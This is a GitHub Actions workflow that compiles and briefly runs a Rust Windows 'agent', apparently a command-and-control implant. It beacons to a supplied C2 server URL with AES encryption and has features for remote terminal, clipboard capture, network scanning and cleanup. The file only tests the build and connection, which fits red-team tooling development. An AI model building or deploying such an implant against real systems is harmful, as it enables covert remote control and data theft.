name: Test Agent Connection

on:
  workflow_dispatch:
    inputs:
      server_url:
        description: 'C2 server URL'
        required: true
        type: string
      aes_key:
        description: 'AES-256 key (hex)'
        required: true
        type: string

jobs:
  test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Rust
        uses: dtolnay/rust-toolchain@stable
        with:
          targets: x86_64-pc-windows-msvc

      - name: Build agent (no evasion)
        working-directory: agent
        shell: bash
        env:
          SG_SERVER_URL: ${{ inputs.server_url }}
          SG_AES_KEY: ${{ inputs.aes_key }}
          SG_SLEEP: "3"
          SG_JITTER: "10"
          SG_KILLDATE: "0"
          SG_WORK_HOURS: ""
        run: |
          cargo build --release --target x86_64-pc-windows-msvc --no-default-features --features "terminal,storage,task_viewer,cleanup,network_scan,clipboard"

      - name: Run agent for 15 seconds
        shell: bash
        run: |
          cd agent/target/x86_64-pc-windows-msvc/release
          echo "Starting agent..."
          ./agent.exe &
          AGENT_PID=$!
          echo "Agent PID: $AGENT_PID"
          sleep 15
          echo "=== DEBUG LOG ==="
          cat agent_debug.log 2>/dev/null || echo "(no debug log)"
          echo "=== Killing ==="
          taskkill //F //PID $AGENT_PID 2>/dev/null || true
          echo "Done."
